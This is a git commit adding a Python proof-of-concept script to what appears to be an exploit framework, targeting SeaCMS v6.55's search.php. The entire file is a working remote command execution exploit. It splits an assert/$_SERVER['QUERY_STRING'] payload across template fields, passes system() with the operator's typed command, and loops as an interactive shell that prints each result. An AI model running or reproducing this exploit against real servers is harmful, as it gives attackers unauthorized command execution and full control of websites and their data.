a444abecdf20b128728a562067d4648014e1b8fa
chybeta <chenhengyi@stu.xmu.edu.cn>
2017-11-30 00:08:06 +0800

    add seacms: v655_eval_getshell

---
+++ scripts/seacms/v655_eval_getshell.py
@@ -0,0 +1,36 @@
+from lib.core.data import target
+import requests
+import re
+
+def poc():
+	try:
+		if  not target.url.endswith("search.php"):
+			print("[*] Please make sure the url end with 'search.php'")
+			exit()
+
+		flag = 1
+		while flag:
+			try:
+				command = raw_input("[*] input the command:")
+				if command != "exit":
+					url = target.url + "?system(%s)" % command
+					postdata = {
+						"searchtype":"5",
+						"searchword":"{if{searchpage:year}",
+						"year":":as{searchpage:area}}",
+						"area":"s{searchpage:letter}",
+						"letter":"ert{searchpage:lang}",
+						"yuyan":"($_SE{searchpage:jq}",
+						"jq":"RVER{searchpage:ver}",
+						"ver":"[QUERY_STRING]));/*"
+					}
+
+					r = requests.post(url,data=postdata)
+					print r.text[:r.text.find("<!DOCTYPE html>")]
+				else:
+					flag = 0
+			except EOFError as e:
+				print "[*] type 'exit' to quit"
+				pass
+	except KeyError as e:
+		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
